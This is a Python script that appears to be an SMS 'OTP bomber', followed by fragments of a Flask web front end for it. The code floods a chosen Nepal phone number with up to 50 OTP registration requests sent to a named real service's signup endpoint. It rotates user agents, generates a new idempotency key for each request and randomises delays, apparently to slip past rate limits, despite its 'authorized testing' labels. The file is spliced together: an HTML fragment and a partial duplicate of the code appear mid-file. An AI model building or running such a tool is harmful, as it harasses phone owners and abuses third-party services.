#!/usr/bin/python3

# -*- coding: UTF-8 -*-


import sys

import json

import logging

import requests

import re

import time

import random

import uuid

from concurrent.futures import ThreadPoolExecutor, as_completed


# Configure logging

logging.basicConfig(

    filename='otp_testing.log',

    level=logging.DEBUG,

    format='%(asctime)s - %(levelname)s - %(message)s'

)


# API Configuration

API_URL = "https://backend.clamphook.com/auth/register"


# User Agents

USER_AGENTS = [

    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",

    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",

]


def validate_phone_number(phone_number):

    """Validate 10-digit Nepal number (98XXXXXXXX or 97XXXXXXXX)."""

    phone_number = phone_number.strip()

    if not re.match(r'^(98|97)\d{8}$', phone_number):

        raise ValueError("Invalid Nepal number. Must be 10 digits starting with 98 or 97.")

    return phone_number


def send_otp_request(phone_number, request_id):

    """Send a single OTP request with corrected success detection."""

    headers = {

        "Host": "backend.clamphook.com",

        "Origin": "https://backend.clamphook.com",

        "User-Agent": random.choice(USER_AGENTS),

        "Content-Type": "application/json",

        "Idempotency-Key": str(uuid.uuid4()),

    }

    payload = {"mobile": f"977-{phone_number}"}


    try:

        response = requests.post(

            API_URL,

            json=payload,

            headers=headers,

            timeout=15,

            verify=True

        )

        logging.debug(f"Request {request_id}: Response - {response.text}")


        if response.status_code == 200:

            try:

                response_json = response.json()

                # Updated success check based on actual API response

                if response_json.get("success", False) and response_json.get("operation") == "register_mobile":

                    logging.info(f"Request {request_id}: Success")

                    return True

                else:

                    logging.error(f"Request {request_id}: API returned false success or wrong operation")

            except json.JSONDecodeError:

                logging.error(f"Request {request_id}: Invalid JSON response")

        else:

            logging.error(f"Request {request_id}: HTTP {response.status_code}")


    except requests.exceptions.RequestException as e:

        logging.error(f"Request {request_id}: Network error - {e}")

    except Exception as e:

        logging.error(f"Request {request_id}: Unexpected error - {e}")


    return False


def main():

    print("\n=== OTP Testing Tool ===")

    print("Note: Use only for authorized testing.\n")


    # Get phone number

    while True:

        try:

            phone_number = input("Enter 10-digit Nepal phone number (e.g., 98XXXXXXXX): ").strip()

            phone_number = validate_phone_number(phone_number)

            break

        except ValueError as e:

            print(f"Error: {e}")


    # Get number of OTPs

    while True:

        try:

            num_otps = int(input("How many OTPs to send? (1-50): ").strip())

            if 1 <= num_otps <= 50:

                break

            else:

                print("Please enter a number between 1 and 50.")

        except ValueError:

            print("Invalid input. Enter a number.")


    # Configure concurrency and delays

    if num_otps <= 5:

        threads = 1

        delay = 1.5

    elif num_otps <= 20:

        threads = 2

        delay = 2.5

    else:

        threads = 3

        delay = 3.5


    print(f"\n[+] Sending {num_otps} OTPs to 977-{phone_number}")

    print(f"[+] Using {threads} threads with a base delay of {delay}s\n")


    # Send OTPs

    with ThreadPoolExecutor(max_workers=threads) as executor:

        futures = []

        for i in range(num_otps):

            futures.append(executor.submit(send_otp_request, phone_number, i+1))

            time.sleep(delay * random.uniform(0.8, 1.2))


        # Track progress

        successes = 0

        for i, future in enumerate(as_completed(futures), 1):

            result = future.result()

            if result:

                successes += 1

                print(f"[{i}/{num_otps}] \033[92mSuccess\033[0m")

            else:

                print(f"[{i}/{num_otps}] \033[91mFailed\033[0m")


    print(f"\n[+] Done. {successes}/{num_otps} OTPs sent successfully.")


if __name__ == "__main__":

    try:

        import requests

        main()

    except ImportError:

        print("Error: Install the 'requests' library first: pip install requests")

        sys.exit(1)        <div class="w-full max-w-lg bg-white rounded-2xl shadow-xl p-8">

          <!-- Header -->
          <h1 class="text-2xl font-bold text-center text-gray-800 mb-6">
            🚀 Send OTP Requests
          </h1>
          <p class="text-center text-gray-600 text-sm mb-6">
            For testing purposes only. Enter a valid Nepal number (starting with 98/97).
          </p>

          <!-- Form -->
          <form method="POST" class="space-y-5" onsubmit="showLoader()">
            <div>
              <label class="block text-left text-sm font-medium text-gray-700 mb-1">📱 Phone Number</label>
              <input type="text" name="phone" placeholder="98XXXXXXXX" required
                class="w-full rounded-xl border-gray-300 focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 p-3 shadow-sm"/>
            </div>

            <div>
              <label class="block text-left text-sm font-medium text-gray-700 mb-1">🔢 Number of OTPs</label>
              <input type="number" name="count" min="1" max="50" placeholder="Count" required
                class="w-full rounded-xl border-gray-300 focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 p-3 shadow-sm"/>
            </div>

            <button type="submit"
              class="w-full py-3 px-4 bg-indigo-600 text-white font-semibold rounded-xl shadow-md hover:bg-indigo-700 hover:scale-[1.02] transition transform duration-200">
              Send OTP
            </button>
          </form>

          <!-- Loader -->
          <div id="loader" class="hidden mt-6 text-center">
            <div class="w-full bg-gray-200 rounded-full h-2.5">
              <div class="bg-indigo-600 h-2.5 rounded-full animate-pulse w-1/2"></div>
            </div>
            <p class="mt-2 text-sm text-gray-600">Sending OTPs...</p>
          </div>

          <!-- Results -->
          {f'''
          <div class="mt-8 p-4 bg-gray-50 rounded-xl border border-gray-200 animate-fadeIn">
            <h3 class="text-lg font-semibold text-gray-800 mb-3">📊 Results:</h3>
            <pre class="text-sm text-gray-700 whitespace-pre-line">{'\\n'.join(result_log)}</pre>
          </div>
          ''' if result_log else ""}

        </div>
      </main>

      <!-- Footer -->
      <footer class="bg-white text-center py-4 shadow-inner">
        <p class="text-sm text-gray-500">🇳🇵 Created with ❤️ by <span class="font-semibold">Laxman Poudel</span></p>
      </footer>

      <!-- Animations & Loader JS -->
      <style>
        @keyframes fadeIn {{
          from {{ opacity: 0; transform: translateY(5px); }}
          to {{ opacity: 1; transform: translateY(0); }}
        }}
        .animate-fadeIn {{
          animation: fadeIn 0.5s ease-in-out;
        }}
      </style>
      <script>
        function showLoader() {{
          document.getElementById('loader').classList.remove('hidden');
        }}
      </script>
    </body>
    </html>
    """        "Idempotency-Key": str(uuid.uuid4()),
    }
    payload = {"mobile": f"977-{phone_number}"}

    try:
        response = requests.post(API_URL, json=payload, headers=headers, timeout=15)
        if response.status_code == 200:
            try:
                response_json = response.json()
                if response_json.get("success", False) and response_json.get("operation") == "register_mobile":
                    return True
            except json.JSONDecodeError:
                pass
    except Exception as e:
        logging.error(f"Error: {e}")
    return False

def run_otp_tool(phone_number, num_otps):
    phone_number = validate_phone_number(phone_number)

    if num_otps <= 5:
        threads, delay = 1, 1.5
    elif num_otps <= 20:
        threads, delay = 2, 2.5
    else:
        threads, delay = 3, 3.5

    results, successes = [], 0

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for i in range(num_otps):
            futures.append(executor.submit(send_otp_request, phone_number, i+1))
            time.sleep(delay * random.uniform(0.8, 1.2))

        for i, future in enumerate(as_completed(futures), 1):
            result = future.result()
            if result:
                successes += 1
                results.append(f"[{i}/{num_otps}] ✅ Success")
            else:
                results.append(f"[{i}/{num_otps}] ❌ Failed")

    results.append(f"\nDone. {successes}/{num_otps} OTPs sent successfully.")
    return results

# ---------- Flask Routes ----------
@app.route("/", methods=["GET", "POST"])
def home():
    result_log = []
    if request.method == "POST":
        phone_number = request.form.get("phone")
        num_otps = int(request.form.get("count"))
        try:
            result_log = run_otp_tool(phone_number, num_otps)
        except Exception as e:
            result_log = [f"Error: {e}"]

    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>OTP Testing Tool</title>
        <style>
            body {{ font-family: Arial, sans-serif; text-align: center; margin: 40px; }}
            input, button {{ padding: 10px; margin: 10px; font-size: 16px; }}
            .log {{ margin-top: 20px; text-align: left; display: inline-block; white-space: pre-line; }}
        </style>
    </head>
    <body>
        <h1>OTP Testing Tool</h1>
        <form method="POST">
            <input type="text" name="phone" placeholder="98XXXXXXXX" required>
            <input type="number" name="count" min="1" max="50" placeholder="Count" required>
            <button type="submit">Send OTP</button>
        </form>

        {f'<div class="log"><h3>Results:</h3><pre>{"\\n".join(result_log)}</pre></div>' if result_log else ""}
    </body>
    </html>
    """
